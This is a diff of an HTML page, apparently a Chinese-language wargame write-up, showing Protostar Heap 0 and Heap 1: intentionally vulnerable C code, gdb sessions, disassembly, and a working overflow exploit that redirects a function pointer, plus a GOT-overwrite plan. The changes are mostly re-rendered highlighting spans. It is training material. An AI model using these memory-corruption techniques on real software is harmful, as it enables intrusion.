@@ -2179,6 +2179,20 @@
 
             
           
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../blockchain/tetctftoken/" class="md-nav__link">
+        TetCTFToken
+      </a>
+    </li>
+  
+
+            
+          
         </ul>
       </nav>
     </li>
@@ -2755,46 +2769,46 @@
 <p>The levels to be exploited can be found in the /opt/protostar/bin directory.</p>
 </blockquote>
 <h2 id="heap-0">Heap 0<a class="headerlink" href="#heap-0" title="Permanent link">&para;</a></h2>
-<div class="highlight"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
-<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>
-<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>
-<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
-<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;sys/types.h&gt;</span><span class="cp"></span>
+<div class="highlight"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;sys/types.h&gt;</span>
 
-<span class="k">struct</span><span class="w"> </span><span class="nc">data</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">name</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span><span class="w"></span>
-<span class="p">};</span><span class="w"></span>
+<span class="k">struct</span><span class="w"> </span><span class="nc">data</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">name</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
+<span class="p">};</span>
 
-<span class="k">struct</span><span class="w"> </span><span class="nc">fp</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="p">(</span><span class="o">*</span><span class="n">fp</span><span class="p">)();</span><span class="w"></span>
-<span class="p">};</span><span class="w"></span>
+<span class="k">struct</span><span class="w"> </span><span class="nc">fp</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="p">(</span><span class="o">*</span><span class="n">fp</span><span class="p">)();</span>
+<span class="p">};</span>
 
-<span class="kt">void</span><span class="w"> </span><span class="nf">winner</span><span class="p">()</span><span class="w"></span>
-<span class="p">{</span><span class="w"></span>
-<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;level passed</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
-<span class="p">}</span><span class="w"></span>
+<span class="kt">void</span><span class="w"> </span><span class="nf">winner</span><span class="p">()</span>
+<span class="p">{</span>
+<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;level passed</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<span class="p">}</span>
 
-<span class="kt">void</span><span class="w"> </span><span class="nf">nowinner</span><span class="p">()</span><span class="w"></span>
-<span class="p">{</span><span class="w"></span>
-<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;level has not been passed</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
-<span class="p">}</span><span class="w"></span>
+<span class="kt">void</span><span class="w"> </span><span class="nf">nowinner</span><span class="p">()</span>
+<span class="p">{</span>
+<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;level has not been passed</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<span class="p">}</span>
 
-<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">argv</span><span class="p">)</span><span class="w"></span>
-<span class="p">{</span><span class="w"></span>
-<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">data</span><span class="w"> </span><span class="o">*</span><span class="n">d</span><span class="p">;</span><span class="w"></span>
-<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">fp</span><span class="w"> </span><span class="o">*</span><span class="n">f</span><span class="p">;</span><span class="w"></span>
+<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">argv</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">data</span><span class="w"> </span><span class="o">*</span><span class="n">d</span><span class="p">;</span>
+<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">fp</span><span class="w"> </span><span class="o">*</span><span class="n">f</span><span class="p">;</span>
 
 <span class="w">  </span><span class="n">d</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">data</span><span class="p">));</span><span class="w">  </span><span class="c1">// 64 bytes</span>
 <span class="w">  </span><span class="n">f</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">fp</span><span class="p">));</span><span class="w">    </span><span class="c1">// 4 bytes</span>
-<span class="w">  </span><span class="n">f</span><span class="o">-&gt;</span><span class="n">fp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">nowinner</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="n">f</span><span class="o">-&gt;</span><span class="n">fp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">nowinner</span><span class="p">;</span>
 
-<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;data is at %p, fp is at %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">d</span><span class="p">,</span><span class="w"> </span><span class="n">f</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;data is at %p, fp is at %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">d</span><span class="p">,</span><span class="w"> </span><span class="n">f</span><span class="p">);</span>
 
-<span class="w">  </span><span class="n">strcpy</span><span class="p">(</span><span class="n">d</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span><span class="w"></span>
+<span class="w">  </span><span class="n">strcpy</span><span class="p">(</span><span class="n">d</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
 
-<span class="w">  </span><span class="n">f</span><span class="o">-&gt;</span><span class="n">fp</span><span class="p">();</span><span class="w"></span>
+<span class="w">  </span><span class="n">f</span><span class="o">-&gt;</span><span class="n">fp</span><span class="p">();</span>
 
-<span class="p">}</span><span class="w"></span>
+<span class="p">}</span>
 </code></pre></div>
 <ul>
 <li>需要修改 <code>f-&gt;fp</code> 的值，使其指向 <code>winner</code> 函数</li>
@@ -2805,63 +2819,63 @@
     <span class="n">s</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">*</span> <span class="mi">4</span>
 <span class="nb">print</span> <span class="n">s</span>
 </code></pre></div>
-<div class="highlight"><pre><span></span><code>$ gdb ./heap0
-<span class="o">(</span>gdb<span class="o">)</span> r <span class="sb">`</span>python /tmp/heap.py<span class="sb">`</span>
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span>gdb<span class="w"> </span>./heap0
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>r<span class="w"> </span><span class="sb">`</span>python<span class="w"> </span>/tmp/heap.py<span class="sb">`</span>
 
-Starting program: /opt/protostar/bin/heap0 <span class="sb">`</span>python /tmp/heap.py<span class="sb">`</span>
-data is at 0x804a008, fp is at 0x804a050
+Starting<span class="w"> </span>program:<span class="w"> </span>/opt/protostar/bin/heap0<span class="w"> </span><span class="sb">`</span>python<span class="w"> </span>/tmp/heap.py<span class="sb">`</span>
+data<span class="w"> </span>is<span class="w"> </span>at<span class="w"> </span>0x804a008,<span class="w"> </span>fp<span class="w"> </span>is<span class="w"> </span>at<span class="w"> </span>0x804a050
 
-Program received signal SIGSEGV, Segmentation fault.
-0x53535353 <span class="k">in</span> ?? <span class="o">()</span> <span class="c1"># S</span>
+Program<span class="w"> </span>received<span class="w"> </span>signal<span class="w"> </span>SIGSEGV,<span class="w"> </span>Segmentation<span class="w"> </span>fault.
+0x53535353<span class="w"> </span><span class="k">in</span><span class="w"> </span>??<span class="w"> </span><span class="o">()</span><span class="w"> </span><span class="c1"># S</span>
 </code></pre></div>
 </li>
 <li>
 <p><code>winner</code> 函数的地址</p>
-<div class="highlight"><pre><span></span><code><span class="o">(</span>gdb<span class="o">)</span> x winner 
-0x8048464 &lt;winner&gt;: 0x83e58955
+<div class="highlight"><pre><span></span><code><span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>x<span class="w"> </span>winner<span class="w"> </span>
+0x8048464<span class="w"> </span>&lt;winner&gt;:<span class="w"> </span>0x83e58955
 </code></pre></div>
 </li>
 </ul>
 <h3 id="exploit">Exploit<a class="headerlink" href="#exploit" title="Permanent link">&para;</a></h3>
-<div class="highlight"><pre><span></span><code>$ ./heap0 <span class="k">$(</span>python -c <span class="s2">&quot;print &#39;A&#39; * 72 + &#39;\x64\x84\x04\x08&#39;&quot;</span><span class="k">)</span>
-data is at 0x804a008, fp is at 0x804a050
-level passed
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span>./heap0<span class="w"> </span><span class="k">$(</span>python<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;print &#39;A&#39; * 72 + &#39;\x64\x84\x04\x08&#39;&quot;</span><span class="k">)</span>
+data<span class="w"> </span>is<span class="w"> </span>at<span class="w"> </span>0x804a008,<span class="w"> </span>fp<span class="w"> </span>is<span class="w"> </span>at<span class="w"> </span>0x804a050
+level<span class="w"> </span>passed
 </code></pre></div>
 <h2 id="heap-1">Heap 1<a class="headerlink" href="#heap-1" title="Permanent link">&para;</a></h2>
-<div class="highlight"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
-<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>
-<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>
-<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
-<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;sys/types.h&gt;</span><span class="cp"></span>
+<div class="highlight"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;sys/types.h&gt;</span>
 
-<span class="k">struct</span><span class="w"> </span><span class="nc">internet</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">priority</span><span class="p">;</span><span class="w"></span>
-<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">name</span><span class="p">;</span><span class="w"></span>
-<span class="p">};</span><span class="w"></span>
+<span class="k">struct</span><span class="w"> </span><span class="nc">internet</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">priority</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">name</span><span class="p">;</span>
+<span class="p">};</span>
 
-<span class="kt">void</span><span class="w"> </span><span class="nf">winner</span><span class="p">()</span><span class="w"></span>
-<span class="p">{</span><span class="w"></span>
-<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;and we have a winner @ %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">time</span><span class="p">(</span><span class="nb">NULL</span><span class="p">));</span><span class="w"></span>
-<span class="p">}</span><span class="w"></span>
+<span class="kt">void</span><span class="w"> </span><span class="nf">winner</span><span class="p">()</span>
+<span class="p">{</span>
+<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;and we have a winner @ %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">time</span><span class="p">(</span><span class="nb">NULL</span><span class="p">));</span>
+<span class="p">}</span>
 
-<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">argv</span><span class="p">)</span><span class="w"></span>
-<span class="p">{</span><span class="w"></span>
-<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">internet</span><span class="w"> </span><span class="o">*</span><span class="n">i1</span><span class="p">,</span><span class="w"> </span><span class="o">*</span><span class="n">i2</span><span class="p">,</span><span class="w"> </span><span class="o">*</span><span class="n">i3</span><span class="p">;</span><span class="w"></span>
+<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">argv</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">internet</span><span class="w"> </span><span class="o">*</span><span class="n">i1</span><span class="p">,</span><span class="w"> </span><span class="o">*</span><span class="n">i2</span><span class="p">,</span><span class="w"> </span><span class="o">*</span><span class="n">i3</span><span class="p">;</span>
 
 <span class="w">  </span><span class="c1">// i1 points to the start of 8 bytes in memory</span>
-<span class="w">  </span><span class="n">i1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">internet</span><span class="p">));</span><span class="w"></span>
-<span class="w">  </span><span class="n">i1</span><span class="o">-&gt;</span><span class="n">priority</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="n">i1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">internet</span><span class="p">));</span>
+<span class="w">  </span><span class="n">i1</span><span class="o">-&gt;</span><span class="n">priority</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
 <span class="w">  </span><span class="n">i1</span><span class="o">-&gt;</span><span class="n">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span><span class="w"> </span><span class="c1">// i1 + 4</span>
 
-<span class="w">  </span><span class="n">i2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">internet</span><span class="p">));</span><span class="w"></span>
-<span class="w">  </span><span class="n">i2</span><span class="o">-&gt;</span><span class="n">priority</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">2</span><span class="p">;</span><span class="w"></span>
-<span class="w">  </span><span class="n">i2</span><span class="o">-&gt;</span><span class="n">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="n">i2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">internet</span><span class="p">));</span>
+<span class="w">  </span><span class="n">i2</span><span class="o">-&gt;</span><span class="n">priority</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">2</span><span class="p">;</span>
+<span class="w">  </span><span class="n">i2</span><span class="o">-&gt;</span><span class="n">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span>
 
 <span class="w">  </span><span class="n">strcpy</span><span class="p">(</span><span class="n">i1</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span><span class="w">    </span><span class="c1">// 超过 8 字节将会影响 i2 对应的内存</span>
-<span class="w">  </span><span class="n">strcpy</span><span class="p">(</span><span class="n">i2</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span><span class="w"></span>
+<span class="w">  </span><span class="n">strcpy</span><span class="p">(</span><span class="n">i2</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
 
-<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;and that&#39;s a wrap folks!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
-<span class="p">}</span><span class="w"></span>
+<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;and that&#39;s a wrap folks!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<span class="p">}</span>
 </code></pre></div>
 <ul>
 <li>
@@ -2869,201 +2883,201 @@ level passed
 <ul>
 <li>可以改变 <code>i2-&gt;name</code> 的值，从而能通过 <code>strcpy</code> 写入任意地址</li>
 </ul>
-<div class="highlight"><pre><span></span><code>$ gdb ./heap1
-<span class="o">(</span>gdb<span class="o">)</span> r AAAABBBBCCCCDDDDEEEEFFFFGGGG <span class="m">00001111222233334444</span>
-Starting program: /opt/protostar/bin/heap1 AAAABBBBCCCCDDDDEEEEFFFFGGGG <span class="m">00001111222233334444</span>
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span>gdb<span class="w"> </span>./heap1
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>r<span class="w"> </span>AAAABBBBCCCCDDDDEEEEFFFFGGGG<span class="w"> </span><span class="m">00001111222233334444</span>
+Starting<span class="w"> </span>program:<span class="w"> </span>/opt/protostar/bin/heap1<span class="w"> </span>AAAABBBBCCCCDDDDEEEEFFFFGGGG<span class="w"> </span><span class="m">00001111222233334444</span>
 
-Program received signal SIGSEGV, Segmentation fault.
-*__GI_strcpy <span class="o">(</span><span class="nv">dest</span><span class="o">=</span>0x46464646 &lt;Address 0x46464646 out of bounds&gt;, <span class="c1"># F</span>
-    <span class="nv">src</span><span class="o">=</span>0xbffff8a1 <span class="s2">&quot;00001111222233334444&quot;</span><span class="o">)</span> at strcpy.c:40
-<span class="m">40</span>  strcpy.c: No such file or directory.
-    <span class="k">in</span> strcpy.c
+Program<span class="w"> </span>received<span class="w"> </span>signal<span class="w"> </span>SIGSEGV,<span class="w"> </span>Segmentation<span class="w"> </span>fault.
+*__GI_strcpy<span class="w"> </span><span class="o">(</span><span class="nv">dest</span><span class="o">=</span>0x46464646<span class="w"> </span>&lt;Address<span class="w"> </span>0x46464646<span class="w"> </span>out<span class="w"> </span>of<span class="w"> </span>bounds&gt;,<span class="w"> </span><span class="c1"># F</span>
+<span class="w">    </span><span class="nv">src</span><span class="o">=</span>0xbffff8a1<span class="w"> </span><span class="s2">&quot;00001111222233334444&quot;</span><span class="o">)</span><span class="w"> </span>at<span class="w"> </span>strcpy.c:40
+<span class="m">40</span><span class="w">  </span>strcpy.c:<span class="w"> </span>No<span class="w"> </span>such<span class="w"> </span>file<span class="w"> </span>or<span class="w"> </span>directory.
+<span class="w">    </span><span class="k">in</span><span class="w"> </span>strcpy.c
 </code></pre></div>
 </li>
 <li>
 <p>注意到最后调用了 <code>printf</code> 函数，可以覆盖其 GOT 表条目</p>
-<div class="highlight"><pre><span></span><code><span class="o">(</span>gdb<span class="o">)</span> <span class="nb">set</span> disassembly-flavor intel
-<span class="o">(</span>gdb<span class="o">)</span> disassemble main
-Dump of assembler code <span class="k">for</span> <span class="k">function</span> main:
-0x080484b9 &lt;main+0&gt;:    push   ebp
-0x080484ba &lt;main+1&gt;:    mov    ebp,esp
-0x080484bc &lt;main+3&gt;:    and    esp,0xfffffff0
-0x080484bf &lt;main+6&gt;:    sub    esp,0x20
-0x080484c2 &lt;main+9&gt;:    mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x8
-0x080484c9 &lt;main+16&gt;:   call   0x80483bc &lt;malloc@plt&gt;
-0x080484ce &lt;main+21&gt;:   mov    DWORD PTR <span class="o">[</span>esp+0x14<span class="o">]</span>,eax
-0x080484d2 &lt;main+25&gt;:   mov    eax,DWORD PTR <span class="o">[</span>esp+0x14<span class="o">]</span>
-0x080484d6 &lt;main+29&gt;:   mov    DWORD PTR <span class="o">[</span>eax<span class="o">]</span>,0x1
-0x080484dc &lt;main+35&gt;:   mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x8
-0x080484e3 &lt;main+42&gt;:   call   0x80483bc &lt;malloc@plt&gt;
-0x080484e8 &lt;main+47&gt;:   mov    edx,eax
-0x080484ea &lt;main+49&gt;:   mov    eax,DWORD PTR <span class="o">[</span>esp+0x14<span class="o">]</span>
-0x080484ee &lt;main+53&gt;:   mov    DWORD PTR <span class="o">[</span>eax+0x4<span class="o">]</span>,edx
-0x080484f1 &lt;main+56&gt;:   mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x8
-0x080484f8 &lt;main+63&gt;:   call   0x80483bc &lt;malloc@plt&gt;
-0x080484fd &lt;main+68&gt;:   mov    DWORD PTR <span class="o">[</span>esp+0x18<span class="o">]</span>,eax
-0x08048501 &lt;main+72&gt;:   mov    eax,DWORD PTR <span class="o">[</span>esp+0x18<span class="o">]</span>
-0x08048505 &lt;main+76&gt;:   mov    DWORD PTR <span class="o">[</span>eax<span class="o">]</span>,0x2
-0x0804850b &lt;main+82&gt;:   mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x8
-0x08048512 &lt;main+89&gt;:   call   0x80483bc &lt;malloc@plt&gt;
-0x08048517 &lt;main+94&gt;:   mov    edx,eax
-0x08048519 &lt;main+96&gt;:   mov    eax,DWORD PTR <span class="o">[</span>esp+0x18<span class="o">]</span>
-0x0804851d &lt;main+100&gt;:  mov    DWORD PTR <span class="o">[</span>eax+0x4<span class="o">]</span>,edx
-0x08048520 &lt;main+103&gt;:  mov    eax,DWORD PTR <span class="o">[</span>ebp+0xc<span class="o">]</span>
-0x08048523 &lt;main+106&gt;:  add    eax,0x4
-0x08048526 &lt;main+109&gt;:  mov    eax,DWORD PTR <span class="o">[</span>eax<span class="o">]</span>
-0x08048528 &lt;main+111&gt;:  mov    edx,eax
-0x0804852a &lt;main+113&gt;:  mov    eax,DWORD PTR <span class="o">[</span>esp+0x14<span class="o">]</span>
-0x0804852e &lt;main+117&gt;:  mov    eax,DWORD PTR <span class="o">[</span>eax+0x4<span class="o">]</span>
-0x08048531 &lt;main+120&gt;:  mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,edx
-0x08048535 &lt;main+124&gt;:  mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
-0x08048538 &lt;main+127&gt;:  call   0x804838c &lt;strcpy@plt&gt;
-0x0804853d &lt;main+132&gt;:  mov    eax,DWORD PTR <span class="o">[</span>ebp+0xc<span class="o">]</span>
-0x08048540 &lt;main+135&gt;:  add    eax,0x8
-0x08048543 &lt;main+138&gt;:  mov    eax,DWORD PTR <span class="o">[</span>eax<span class="o">]</span>
-0x08048545 &lt;main+140&gt;:  mov    edx,eax
-0x08048547 &lt;main+142&gt;:  mov    eax,DWORD PTR <span class="o">[</span>esp+0x18<span class="o">]</span>
-0x0804854b &lt;main+146&gt;:  mov    eax,DWORD PTR <span class="o">[</span>eax+0x4<span class="o">]</span>
-0x0804854e &lt;main+149&gt;:  mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,edx
-0x08048552 &lt;main+153&gt;:  mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
-0x08048555 &lt;main+156&gt;:  call   0x804838c &lt;strcpy@plt&gt;
-0x0804855a &lt;main+161&gt;:  mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x804864b
-0x08048561 &lt;main+168&gt;:  call   0x80483cc &lt;puts@plt&gt; <span class="c1"># 由于编译优化，实际上调用的是 puts</span>
-0x08048566 &lt;main+173&gt;:  leave  
-0x08048567 &lt;main+174&gt;:  ret    
-End of assembler dump.
-<span class="o">(</span>gdb<span class="o">)</span> disassemble 0x80483cc
-Dump of assembler code <span class="k">for</span> <span class="k">function</span> puts@plt:
-0x080483cc &lt;puts@plt+0&gt;:    jmp    DWORD PTR ds:0x8049774
-0x080483d2 &lt;puts@plt+6&gt;:    push   0x30
-0x080483d7 &lt;puts@plt+11&gt;:   jmp    0x804835c
-End of assembler dump.
-<span class="o">(</span>gdb<span class="o">)</span> x 0x8049774
-0x8049774 &lt;_GLOBAL_OFFSET_TABLE_+36&gt;:   0x080483d2
+<div class="highlight"><pre><span></span><code><span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span><span class="nb">set</span><span class="w"> </span>disassembly-flavor<span class="w"> </span>intel
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>disassemble<span class="w"> </span>main
+Dump<span class="w"> </span>of<span class="w"> </span>assembler<span class="w"> </span>code<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="k">function</span><span class="w"> </span>main:
+0x080484b9<span class="w"> </span>&lt;main+0&gt;:<span class="w">    </span>push<span class="w">   </span>ebp
+0x080484ba<span class="w"> </span>&lt;main+1&gt;:<span class="w">    </span>mov<span class="w">    </span>ebp,esp
+0x080484bc<span class="w"> </span>&lt;main+3&gt;:<span class="w">    </span>and<span class="w">    </span>esp,0xfffffff0
+0x080484bf<span class="w"> </span>&lt;main+6&gt;:<span class="w">    </span>sub<span class="w">    </span>esp,0x20
+0x080484c2<span class="w"> </span>&lt;main+9&gt;:<span class="w">    </span>mov<span class="w">    </span>DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp<span class="o">]</span>,0x8
+0x080484c9<span class="w"> </span>&lt;main+16&gt;:<span class="w">   </span>call<span class="w">   </span>0x80483bc<span class="w"> </span>&lt;malloc@plt&gt;
+0x080484ce<span class="w"> </span>&lt;main+21&gt;:<span class="w">   </span>mov<span class="w">    </span>DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp+0x14<span class="o">]</span>,eax
+0x080484d2<span class="w"> </span>&lt;main+25&gt;:<span class="w">   </span>mov<span class="w">    </span>eax,DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp+0x14<span class="o">]</span>
+0x080484d6<span class="w"> </span>&lt;main+29&gt;:<span class="w">   </span>mov<span class="w">    </span>DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>eax<span class="o">]</span>,0x1
+0x080484dc<span class="w"> </span>&lt;main+35&gt;:<span class="w">   </span>mov<span class="w">    </span>DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp<span class="o">]</span>,0x8
+0x080484e3<span class="w"> </span>&lt;main+42&gt;:<span class="w">   </span>call<span class="w">   </span>0x80483bc<span class="w"> </span>&lt;malloc@plt&gt;
+0x080484e8<span class="w"> </span>&lt;main+47&gt;:<span class="w">   </span>mov<span class="w">    </span>edx,eax
+0x080484ea<span class="w"> </span>&lt;main+49&gt;:<span class="w">   </span>mov<span class="w">    </span>eax,DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp+0x14<span class="o">]</span>
+0x080484ee<span class="w"> </span>&lt;main+53&gt;:<span class="w">   </span>mov<span class="w">    </span>DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>eax+0x4<span class="o">]</span>,edx
+0x080484f1<span class="w"> </span>&lt;main+56&gt;:<span class="w">   </span>mov<span class="w">    </span>DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp<span class="o">]</span>,0x8
+0x080484f8<span class="w"> </span>&lt;main+63&gt;:<span class="w">   </span>call<span class="w">   </span>0x80483bc<span class="w"> </span>&lt;malloc@plt&gt;
